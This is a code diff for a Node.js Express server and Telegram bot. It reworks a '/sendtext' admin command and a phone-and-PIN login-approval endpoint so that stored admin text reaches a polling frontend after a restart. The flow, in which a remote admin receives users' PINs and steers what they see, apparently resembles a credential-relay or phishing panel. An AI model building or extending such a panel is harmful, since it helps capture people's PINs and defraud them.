@@ -785,44 +785,54 @@ const botOk = (res) => {
 // The library's onText / on('message') silently drops text messages in this
 // webhook + processUpdate setup.  bot.sendMessage for replies works fine —
 // it's only the inbound EVENT routing that's broken.
+// ── /sendtext handler — called directly from webhook route ───────────────────
+// Runs at Express level — no dependency on node-telegram-bot-api events.
+// Auto-creates a pendingSendTexts entry if none exists (handles server restart
+// where in-memory state was lost between the callback and the /sendtext command).
 async function handleSendTextCommand(chatId, rawPhone, body) {
   const phone = normalise(rawPhone.trim());
   body = body.trim();
 
   log.info(`/sendtext from admin — phone=${phone} text="${body.slice(0, 60)}"`);
 
-  const pending = pendingSendTexts.get(phone);
+  let pending = pendingSendTexts.get(phone);
 
+  // If no entry exists (e.g. server restarted and state was lost),
+  // create one on the fly so the frontend can still pick it up.
   if (!pending) {
-    log.warn(`/sendtext: no pending entry for ${phone}. Keys: [${[...pendingSendTexts.keys()].join(', ')}]`);
-    await bot.sendMessage(chatId,
-      `⚠️ No pending send-text request for <code>${phone}</code>.\n\n` +
-      `Either it timed out, was already fulfilled, or the phone doesn't match.\n\n` +
-      `📋 Active phones: ${[...pendingSendTexts.keys()].join(', ') || '(none)'}`,
-      { parse_mode: 'HTML' }).catch(e => log.error('sendText reply err:', e.message));
-    return;
+    log.warn(`/sendtext: no prior entry for ${phone} — auto-creating (likely server restart)`);
+    pending = { ts: Date.now(), text: null, resolved: false, readAt: null };
+    pendingSendTexts.set(phone, pending);
   }
 
   if (Date.now() - pending.ts > CFG.SEND_TEXT_TIMEOUT) {
     pendingSendTexts.delete(phone);
-    await bot.sendMessage(chatId,
-      `⏰ Expired (5-minute window passed).`,
-      { parse_mode: 'HTML' }).catch(() => {});
+    if (bot && botHealthy) {
+      await bot.sendMessage(chatId,
+        `⏰ Expired (5-minute window passed).`,
+        { parse_mode: 'HTML' }).catch(() => {});
+    }
     return;
   }
 
+  // Resolve — frontend polling /check-text-content will pick this up
   pending.text     = sanitize(body);
   pending.resolved = true;
   pending.readAt   = null;
 
   log.info(`✅ /sendtext RESOLVED for ${phone}`);
 
-  await bot.sendMessage(chatId,
-    `✅ <b>Text sent to frontend!</b>\n\n` +
-    `📞 <code>${phone}</code>\n` +
-    `💬 <code>${sanitize(body)}</code>\n\n` +
-    `User will now see the Send Message button.`,
-    { parse_mode: 'HTML' }).catch(e => log.error('sendText confirm err:', e.message));
+  // Try to reply to admin — bot may not be ready after restart, that's OK
+  if (bot && botHealthy) {
+    await bot.sendMessage(chatId,
+      `✅ <b>Text sent to frontend!</b>\n\n` +
+      `📞 <code>${phone}</code>\n` +
+      `💬 <code>${sanitize(body)}</code>\n\n` +
+      `User will now see the Send Message button.`,
+      { parse_mode: 'HTML' }).catch(e => log.error('sendText confirm err:', e.message));
+  } else {
+    log.warn(`Bot not ready — text stored for ${phone}, reply to admin skipped`);
+  }
 }
 
 // ── Webhook endpoint ─────────────────────────────────────────────────────────
@@ -837,14 +847,15 @@ app.post('/webhook/:token', async (req, res) => {
   if (req.params.token !== process.env.BOT_TOKEN) return res.sendStatus(403);
   const upd = req.body;
 
-  // Log EVERY incoming update (always, not just debug)
+  // Log EVERY incoming update
   const updType = upd.message ? 'msg' : upd.callback_query ? 'cb' : '?';
   const snippet = upd.message?.text?.slice(0, 60) || upd.callback_query?.data?.slice(0, 40) || '';
   log.info(`⬇️  [${updType}] ${snippet}`);
 
-  // ── Intercept /sendtext HERE — before processUpdate ────────────────────────
-  // This runs at Express level so it ALWAYS fires for text messages.
-  if (upd.message?.text && bot && botHealthy) {
+  // ── Intercept /sendtext HERE — NO bot guard ────────────────────────────────
+  // Even if bot hasn't initialised yet (e.g. right after restart), we still
+  // store the text so the frontend can pick it up via /check-text-content.
+  if (upd.message?.text) {
     const msgText = upd.message.text;
     const chatId  = String(upd.message.chat.id);
     const match   = msgText.match(/^\/sendtext(?:@\S+)?\s+(\S+)\s+([\s\S]+)/);
@@ -914,12 +925,22 @@ app.post('/api/:userId/check-login-approval', resolveUser, (req, res) => {
   const { pin } = req.body, raw = req.body.phoneNumber;
   if (!raw || !pin) return res.status(400).json({ success: false, message: 'Phone and PIN required' });
   const phone = normalise(raw), rec = req.user.logins.get(`${phone}-${pin}`);
-  if (!rec) return res.json({ success: true, approved: false, rejected: false, expired: false });
+
+  // ── Fallback: if no login record but pendingSendTexts has an entry for this
+  //    phone, the admin already sent /sendtext (possibly after a server restart).
+  //    Signal sendText so the frontend switches to polling /check-text-content. ──
+  if (!rec) {
+    const stEntry = pendingSendTexts.get(phone);
+    if (stEntry) {
+      return res.json({ success: true, sendText: true });
+    }
+    return res.json({ success: true, approved: false, rejected: false, expired: false });
+  }
+
   if (Date.now() - rec.ts > CFG.APPROVAL_TIMEOUT)
     return res.json({ success: true, approved: false, rejected: true, expired: true });
 
-  // ── sendText: just signal that admin chose this path ──────────────────────
-  // Frontend will then switch to polling /check-text-content for the actual text
+  // ── sendText: signal that admin chose this path ──────────────────────────
   if (rec.sendText) {
     return res.json({ success: true, sendText: true });
   }
